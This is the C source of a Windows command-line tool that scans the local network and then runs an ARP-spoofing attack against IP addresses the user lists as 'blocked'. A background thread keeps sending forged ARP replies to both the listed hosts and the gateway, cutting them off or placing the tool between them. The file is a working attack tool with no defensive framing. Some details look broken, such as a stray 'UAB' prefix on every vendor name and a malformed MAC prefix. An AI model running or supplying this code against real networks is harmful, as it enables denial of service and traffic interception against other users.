#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include <pcap.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <stdbool.h>

#define BLOCKED_IPS_FILE "blocked_ips.txt"
#define LOG_FILE "arpcli.log"
#define MAX_IPS 256
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ETHERNET_HEADER_LEN 14
#define ARP_HEADER_LEN 28
#define PACKET_SIZE 42

#pragma pack(push, 1)
typedef struct ethernet_header {
    u_char dst_mac[6];
    u_char src_mac[6];
    u_short type;
} ethernet_header_t;

typedef struct arp_header {
    u_short htype;
    u_short ptype;
    u_char hlen;
    u_char plen;
    u_short oper;
    u_char sha[6];
    u_char spa[4];
    u_char tha[6];
    u_char tpa[4];
} arp_header_t;
#pragma pack(pop)

typedef struct {
    char ip[16];
    char mac[18];
    char name[256];
    char vendor[256];
    int blocked;
} DeviceInfo;

char* blocked_ips[MAX_IPS];
int blocked_count = 0;
DeviceInfo devices[MAX_IPS];
int device_count = 0;
pcap_t* handle = NULL;
u_char gateway_ip[4] = {0};
u_char gateway_mac[6] = {0};
u_char local_mac[6] = {0};
u_char local_ip[4] = {0};
char current_device[256] = {0};
int running = 0;
time_t last_file_check = 0;
bool blocked_ips_changed = false;

// Vendor database (simplified)
typedef struct {
    const char* prefix;
    const char* vendor;
} VendorEntry;

VendorEntry vendor_db[] = {
    {"10:E9:92", "UAB \"INGRAM MICRO SERVICES\""},
    {"78:F2:76", "UAB \"Cyklop Fastjet Technologies (Shanghai) Inc.\""},
    {"28:6F:B9", "UAB \"Nokia Shanghai Bell Co., Ltd.\""},
    {"E0:A1:29", "UAB \"Extreme Networks Headquarters\""},
    {"A8:C6:47", "UAB \"Extreme Networks Headquarters\""},
    {"A4:C7:F6", "UAB \"Extreme Networks Headquarters\""},
    {"F4:EA:B5", "UAB \"Extreme Networks Headquarters\""},
    {"B8:7C:F2", "UAB \"Extreme Networks Headquarters\""},
    {"B4:2D:56", "UAB \"Extreme Networks Headquarters\""},
    {"A4:73:AB", "UAB \"Extreme Networks Headquarters\""},
    {"0C:9B:78", "UAB \"Extreme Networks Headquarters\""},
    {"19:77:", "UAB \"Extreme Networks Headquarters\""},
    {"08:EA:44", "UAB \"Extreme Networks Headquarters\""},
    {"90:75:DE", "UAB \"Zebra Technologies Inc.\""},
    {"80:BA:16", "UAB \"Micas Networks Inc.\""},
    {"B8:4C:87", "UAB \"IEEE Registration Authority\""},
    {"20:F8:3B", "UAB \"Nabu Casa, Inc.\""},
    {"F0:1B:24", "UAB \"zte corporation\""},
    {"E8:0A:B9", "UAB \"Cisco Systems, Inc\""},
    {"78:46:5F", "UAB \"Fiberhome Telecommunication Technologies Co.,LTD\""},
    {"38:E2:CA", "UAB \"Katun Corporation\""},
    { NULL, "Unknown Vendor" }
};

void log_activity(const char* message) {
    FILE* log_file = fopen(LOG_FILE, "a");
    if (log_file) {
        time_t now = time(NULL);
        char timestamp[32];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fclose(log_file);
    }
}

const char* get_vendor_from_mac(const char* mac) {
    if (!mac || strlen(mac) < 8) {
        return "Unknown Vendor";
    }

    char prefix[9];
    strncpy(prefix, mac, 8);
    prefix[8] = '\0';

    for (int i = 0; i < 8; i++) {
        prefix[i] = toupper(prefix[i]);
    }

    for (int i = 0; vendor_db[i].prefix != NULL; i++) {
        if (strncmp(prefix, vendor_db[i].prefix, 8) == 0) {
            return vendor_db[i].vendor;
        }
    }

    return "Unknown Vendor";
}

void _send_arp_request(u_char target_ip[4]);
void _add_device_if_new(u_char *ip, u_char *mac);

void print_usage() {
    printf("ARP CLI Tool - Enhanced Windows Version\n");
    printf("Usage:\n");
    printf("  arpcli scan               - Scan network (no need to start first)\n");
    printf("  arpcli block <IP>         - Block an IP (add to list)\n");
    printf("  arpcli unblock <IP>       - Unblock an IP (remove from list)\n");
    printf("  arpcli list               - List blocked IPs\n");
    printf("  arpcli start              - Start ARP spoofing blocked IPs\n");
    printf("  arpcli stop               - Stop ARP spoofing\n");
    printf("  arpcli interfaces         - List available network interfaces\n");
}

void load_blocked_ips() {
    FILE* file = fopen(BLOCKED_IPS_FILE, "r");
    if (!file) return;

    // Temporary storage for new IPs
    char* new_ips[MAX_IPS];
    int new_count = 0;
    char line[16];
    
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\n")] = 0;
        new_ips[new_count] = strdup(line);
        new_count++;
        if (new_count >= MAX_IPS) break;
    }
    fclose(file);
    
    // Check if the list has changed
    if (new_count != blocked_count) {
        blocked_ips_changed = true;
    } else {
        for (int i = 0; i < blocked_count; i++) {
            if (strcmp(blocked_ips[i], new_ips[i]) != 0) {
                blocked_ips_changed = true;
                break;
            }
        }
    }
    
    // Free old IPs and copy new ones
    for (int i = 0; i < blocked_count; i++) {
        free(blocked_ips[i]);
    }
    
    for (int i = 0; i < new_count; i++) {
        blocked_ips[i] = new_ips[i];
    }
    blocked_count = new_count;
    
    last_file_check = time(NULL);
}

void save_blocked_ips() {
    FILE* file = fopen(BLOCKED_IPS_FILE, "w");
    if (!file) {
        printf("Error: Could not save blocked IPs\n");
        return;
    }

    for (int i = 0; i < blocked_count; i++) {
        fprintf(file, "%s\n", blocked_ips[i]);
    }
    fclose(file);
    blocked_ips_changed = true;
    log_activity("Blocked IP list updated");
}

int is_ip_blocked(const char* ip) {
    for (int i = 0; i < blocked_count; i++) {
        if (strcmp(blocked_ips[i], ip) == 0) {
            return 1;
        }
    }
    return 0;
}

void add_blocked_ip(const char* ip) {
    if (blocked_count >= MAX_IPS) {
        printf("Error: Maximum number of blocked IPs reached\n");
        return;
    }

    if (is_ip_blocked(ip)) {
        printf("IP %s is already blocked\n", ip);
        return;
    }

    blocked_ips[blocked_count] = strdup(ip);
    blocked_count++;
    save_blocked_ips();
    printf("Added %s to blocked list\n", ip);
    char log_msg[256];
    snprintf(log_msg, sizeof(log_msg), "Blocked IP: %s", ip);
    log_activity(log_msg);
}

void remove_blocked_ip(const char* ip) {
    for (int i = 0; i < blocked_count; i++) {
        if (strcmp(blocked_ips[i], ip) == 0) {
            free(blocked_ips[i]);
            for (int j = i; j < blocked_count - 1; j++) {
                blocked_ips[j] = blocked_ips[j + 1];
            }
            blocked_count--;
            save_blocked_ips();
            printf("Removed %s from blocked list\n", ip);
            char log_msg[256];
            snprintf(log_msg, sizeof(log_msg), "Unblocked IP: %s", ip);
            log_activity(log_msg);
            return;
        }
    }
    printf("IP %s not found in blocked list\n", ip);
}

void list_blocked_ips() {
    if (blocked_count == 0) {
        printf("No IPs are currently blocked\n");
        return;
    }

    printf("Blocked IPs:\n");
    for (int i = 0; i < blocked_count; i++) {
        printf("  %s\n", blocked_ips[i]);
    }
}

void get_local_mac_and_ip(const char* dev) {
    pcap_if_t* alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    for (pcap_if_t* d = alldevs; d != NULL; d = d->next) {
        if (strcmp(d->name, dev) == 0) {
            PIP_ADAPTER_INFO pAdapterInfo = NULL;
            ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
            
            pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
            if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
                free(pAdapterInfo);
                pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
            }
            
            if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
                PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
                while (pAdapter) {
                    if (strstr(dev, pAdapter->AdapterName) != NULL) {
                        memcpy(local_mac, pAdapter->Address, 6);
                        break;
                    }
                    pAdapter = pAdapter->Next;
                }
            }
            free(pAdapterInfo);
            
            for (pcap_addr_t* a = d->addresses; a != NULL; a = a->next) {
                if (a->addr->sa_family == AF_INET) {
                    memcpy(local_ip, &((struct sockaddr_in*)a->addr)->sin_addr, 4);
                    break;
                }
            }
            break;
        }
    }
    pcap_freealldevs(alldevs);
}

void get_gateway_info() {
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    DWORD dwRetVal = 0;

    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    }

    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (strstr(current_device, pAdapter->AdapterName) != NULL) {
                sscanf(pAdapter->GatewayList.IpAddress.String, 
                       "%hhu.%hhu.%hhu.%hhu", 
                       &gateway_ip[0], &gateway_ip[1], 
                       &gateway_ip[2], &gateway_ip[3]);
                
                char errbuf[PCAP_ERRBUF_SIZE];
                u_char packet[PACKET_SIZE] = {0};
                ethernet_header_t* eth = (ethernet_header_t*)packet;
                arp_header_t* arp = (arp_header_t*)(packet + ETHERNET_HEADER_LEN);

                memset(eth->dst_mac, 0xff, 6);
                memcpy(eth->src_mac, local_mac, 6);
                eth->type = htons(0x0806);

                arp->htype = htons(1);
                arp->ptype = htons(0x0800);
                arp->hlen = 6;
                arp->plen = 4;
                arp->oper = htons(ARP_REQUEST);
                memcpy(arp->sha, local_mac, 6);
                memcpy(arp->spa, local_ip, 4);
                memset(arp->tha, 0, 6);
                memcpy(arp->tpa, gateway_ip, 4);

                struct pcap_pkthdr* header;
                const u_char* pkt_data;
                time_t start = time(NULL);
                
                while (time(NULL) - start < 3) {
                    if (pcap_sendpacket(handle, packet, PACKET_SIZE) != 0) {
                        printf("Error sending ARP: %s\n", pcap_geterr(handle));
                    }
                    
                    int res = pcap_next_ex(handle, &header, &pkt_data);
                    if (res > 0 && header->len >= ETHERNET_HEADER_LEN + ARP_HEADER_LEN) {
                        arp_header_t* reply = (arp_header_t*)(pkt_data + ETHERNET_HEADER_LEN);
                        if (ntohs(reply->oper) == ARP_REPLY && 
                            memcmp(reply->spa, gateway_ip, 4) == 0) {
                            memcpy(gateway_mac, reply->sha, 6);
                            break;
                        }
                    }
                    Sleep(100);
                }
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
}

void send_arp_spoof(u_char* target_ip, u_char* spoof_ip, u_char* target_mac) {
    u_char packet[PACKET_SIZE] = {0};
    ethernet_header_t* eth = (ethernet_header_t*)packet;
    arp_header_t* arp = (arp_header_t*)(packet + ETHERNET_HEADER_LEN);

    memcpy(eth->dst_mac, target_mac, 6);
    memcpy(eth->src_mac, local_mac, 6);
    eth->type = htons(0x0806);

    arp->htype = htons(1);
    arp->ptype = htons(0x0800);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(ARP_REPLY);
    memcpy(arp->sha, local_mac, 6);
    memcpy(arp->spa, spoof_ip, 4);
    memcpy(arp->tha, target_mac, 6);
    memcpy(arp->tpa, target_ip, 4);

    if (pcap_sendpacket(handle, packet, PACKET_SIZE) != 0) {
        printf("Error sending ARP spoof packet: %s\n", pcap_geterr(handle));
    }
}
void init_network_interface(const char* dev) {
    if (handle) return;

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Couldn't open device %s: %s\n", dev, errbuf);
        return;
    }

    strncpy(current_device, dev, sizeof(current_device)-1);
    get_local_mac_and_ip(dev);
    get_gateway_info();

    printf("Network interface initialized:\n");
    printf("  Local IP: %d.%d.%d.%d\n", local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
    printf("  Local MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           local_mac[0], local_mac[1], local_mac[2], 
           local_mac[3], local_mac[4], local_mac[5]);
    printf("  Gateway IP: %d.%d.%d.%d\n", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
    printf("  Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           gateway_mac[0], gateway_mac[1], gateway_mac[2], 
           gateway_mac[3], gateway_mac[4], gateway_mac[5]);
}
void scan_network() {
    pcap_if_t *alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error finding devices: %s\n", errbuf);
        return;
    }

    // Select the first non-loopback interface
    pcap_if_t *selected_dev = NULL;
    for (pcap_if_t *d = alldevs; d != NULL; d = d->next) {
        if (strstr(d->name, "Loopback") == NULL && strstr(d->name, "NPF_") != NULL) {
            selected_dev = d;
            break;
        }
    }

    if (selected_dev == NULL) {
        printf("No suitable network interface found!\n");
        pcap_freealldevs(alldevs);
        return;
    }

    printf("Scanning network on interface: %s\n", selected_dev->name);
    init_network_interface(selected_dev->name);
    pcap_freealldevs(alldevs);

    // Set ARP filter
    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "arp", 0, 0) == -1 || 
        pcap_setfilter(handle, &fp) == -1) {
        printf("Failed to set ARP filter\n");
        return;
    }

    device_count = 0;
    u_char network_prefix[3] = {local_ip[0], local_ip[1], local_ip[2]};

    // 1. First listen passively for existing ARP traffic (2 seconds)
    printf("Listening for existing ARP traffic...\n");
    time_t passive_start = time(NULL);
    while (time(NULL) - passive_start < 2) {
        struct pcap_pkthdr *header;
        const u_char *pkt_data;
        int res = pcap_next_ex(handle, &header, &pkt_data);

        if (res > 0 && header->len >= ETHERNET_HEADER_LEN + ARP_HEADER_LEN) {
            arp_header_t *arp = (arp_header_t *)(pkt_data + ETHERNET_HEADER_LEN);
            if (ntohs(arp->oper) == ARP_REPLY) {
                _add_device_if_new(arp->spa, arp->sha);
            }
        }
    }

    // 2. Send ARP requests to all IPs in our subnet
    printf("Sending ARP requests to %d.%d.%d.1-254...\n", 
           network_prefix[0], network_prefix[1], network_prefix[2]);
    
    for (int i = 1; i < 255; i++) {
        if (i == local_ip[3] || i == gateway_ip[3]) continue;

        u_char target_ip[4] = {network_prefix[0], network_prefix[1], network_prefix[2], (u_char)i};
        _send_arp_request(target_ip);
    }

    // 3. Listen for responses (3 seconds)
    printf("Listening for ARP responses...\n");
    time_t active_start = time(NULL);
    while (time(NULL) - active_start < 3) {
        struct pcap_pkthdr *header;
        const u_char *pkt_data;
        int res = pcap_next_ex(handle, &header, &pkt_data);

        if (res > 0 && header->len >= ETHERNET_HEADER_LEN + ARP_HEADER_LEN) {
            arp_header_t *arp = (arp_header_t *)(pkt_data + ETHERNET_HEADER_LEN);
            if (ntohs(arp->oper) == ARP_REPLY) {
                _add_device_if_new(arp->spa, arp->sha);
            }
        }
    }

    // 4. Print results
    printf("\nScan complete. Found %d devices:\n", device_count);
    printf("IP Address      MAC Address        Hostname                 Vendor            Status\n");
    printf("------------------------------------------------------------------------------\n");
    
    for (int i = 0; i < device_count; i++) {
        printf("%-15s %-17s %-24s %-18s %s\n",
               devices[i].ip, devices[i].mac, devices[i].name,
               devices[i].vendor, devices[i].blocked ? "(Blocked)" : "");
    }
}

void _send_arp_request(u_char target_ip[4]) {
    u_char packet[PACKET_SIZE] = {0};
    ethernet_header_t *eth = (ethernet_header_t *)packet;
    arp_header_t *arp = (arp_header_t *)(packet + ETHERNET_HEADER_LEN);

    // Broadcast MAC
    memset(eth->dst_mac, 0xff, 6);
    memcpy(eth->src_mac, local_mac, 6);
    eth->type = htons(0x0806); // ARP

    arp->htype = htons(1); // Ethernet
    arp->ptype = htons(0x0800); // IPv4
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(ARP_REQUEST);
    memcpy(arp->sha, local_mac, 6);
    memcpy(arp->spa, local_ip, 4);
    memset(arp->tha, 0, 6);
    memcpy(arp->tpa, target_ip, 4);

    if (pcap_sendpacket(handle, packet, PACKET_SIZE) != 0) {
        printf("Error sending ARP request to %d.%d.%d.%d\n", 
               target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    }
}

void _add_device_if_new(u_char *ip, u_char *mac) {
    char ip_str[16];
    snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

    // Skip invalid IPs
    if (strcmp(ip_str, "0.0.0.0") == 0 || strcmp(ip_str, "255.255.255.255") == 0) {
        return;
    }

    // Check if already in our list
    for (int i = 0; i < device_count; i++) {
        if (strcmp(devices[i].ip, ip_str) == 0) {
            return;
        }
    }

    if (device_count >= MAX_IPS) {
        printf("Warning: Reached maximum device count\n");
        return;
    }

    // Add new device
    DeviceInfo *dev = &devices[device_count++];
    strcpy(dev->ip, ip_str);
    snprintf(dev->mac, sizeof(dev->mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    // Get hostname
    struct in_addr addr;
    addr.s_addr = *(uint32_t *)ip;
    struct hostent *host = gethostbyaddr((char *)&addr, sizeof(addr), AF_INET);
    strncpy(dev->name, host ? host->h_name : "Unknown", sizeof(dev->name) - 1);

    // Get vendor
    const char* vendor = get_vendor_from_mac(dev->mac);
    printf("Vendor detected: %s for MAC: %s\n", vendor, dev->mac);
    strncpy(dev->vendor, vendor, sizeof(dev->vendor) - 1);

    // Check if blocked
    dev->blocked = is_ip_blocked(dev->ip);
}

DWORD WINAPI spoof_thread(LPVOID lpParam) {
    log_activity("ARP spoofing started");
    printf("ARP spoofing started. Press Enter to stop.\n");

    while (running) {
        // Check for file changes every 10 seconds
        if (time(NULL) - last_file_check > 10) {
            load_blocked_ips();
            char log_msg[256];
            snprintf(log_msg, sizeof(log_msg), 
                    "Checked blocked IP list (%d IPs, changed: %s)", 
                    blocked_count, blocked_ips_changed ? "yes" : "no");
            log_activity(log_msg);
        }

        // Send ARP packets continuously with small delay between each IP
        for (int i = 0; i < blocked_count && running; i++) {
            u_char target_ip[4];
            sscanf(blocked_ips[i], "%hhu.%hhu.%hhu.%hhu", 
                   &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]);

            send_arp_spoof(target_ip, gateway_ip, gateway_mac);
            send_arp_spoof(gateway_ip, target_ip, gateway_mac);
            
            // Small delay between each IP to avoid flooding
            Sleep(100);
        }
        
        // Short delay before next cycle
        Sleep(1000);
    }

    log_activity("ARP spoofing stopped");
    printf("ARP spoofing stopped.\n");
    return 0;
}

void list_interfaces() {
    pcap_if_t *alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error finding devices: %s\n", errbuf);
        return;
    }

    printf("Available network interfaces:\n");
    for(pcap_if_t *d = alldevs; d != NULL; d = d->next) {
        printf("  %s", d->name);
        if (d->description)
            printf(" (%s)", d->description);
        printf("\n");
    }
    
    pcap_freealldevs(alldevs);
}

void start_spoofing() {
    if (running) {
        printf("ARP spoofing is already running\n");
        return;
    }

    if (blocked_count == 0) {
        printf("No IPs to spoof. Add IPs with 'block' command first.\n");
        return;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        printf("Error finding devices: %s\n", errbuf);
        return;
    }

    pcap_if_t *d;
    for(d = alldevs; d != NULL; d = d->next) {
        if(strstr(d->name, "NPF_") != NULL) {
            break;
        }
    }

    if(d == NULL) {
        printf("No suitable network interface found!\n");
        pcap_freealldevs(alldevs);
        return;
    }

    printf("Using network interface: %s\n", d->name);
    strncpy(current_device, d->name, sizeof(current_device)-1);
    
    handle = pcap_open_live(d->name, BUFSIZ, 1, 1000, errbuf);
    pcap_freealldevs(alldevs);
    
    if (handle == NULL) {
        printf("Couldn't open device %s: %s\n", d->name, errbuf);
        return;
    }

    get_local_mac_and_ip(current_device);
    get_gateway_info();

    printf("Local IP: %d.%d.%d.%d\n", local_ip[0], local_ip[1], local_ip[2], local_ip[3]);
    printf("Local MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           local_mac[0], local_mac[1], local_mac[2], 
           local_mac[3], local_mac[4], local_mac[5]);
    printf("Gateway IP: %d.%d.%d.%d\n", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
    printf("Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           gateway_mac[0], gateway_mac[1], gateway_mac[2], 
           gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    running = 1;
    CreateThread(NULL, 0, spoof_thread, NULL, 0, NULL);
}

void stop_spoofing() {
    running = 0;
    if (handle) {
        pcap_close(handle);
        handle = NULL;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        print_usage();
        return 1;
    }

    load_blocked_ips();

    if (strcmp(argv[1], "scan") == 0) {
        scan_network();
    } else if (strcmp(argv[1], "block") == 0 && argc == 3) {
        add_blocked_ip(argv[2]);
    } else if (strcmp(argv[1], "unblock") == 0 && argc == 3) {
        remove_blocked_ip(argv[2]);
    } else if (strcmp(argv[1], "list") == 0) {
        list_blocked_ips();
    } else if (strcmp(argv[1], "start") == 0) {
        start_spoofing();
        printf("Press Enter to stop...\n");
        getchar();
        stop_spoofing();
    } else if (strcmp(argv[1], "stop") == 0) {
        stop_spoofing();
    } else if (strcmp(argv[1], "interfaces") == 0) {
        list_interfaces();
    } else {
        print_usage();
        return 1;
    }

    return 0;
}
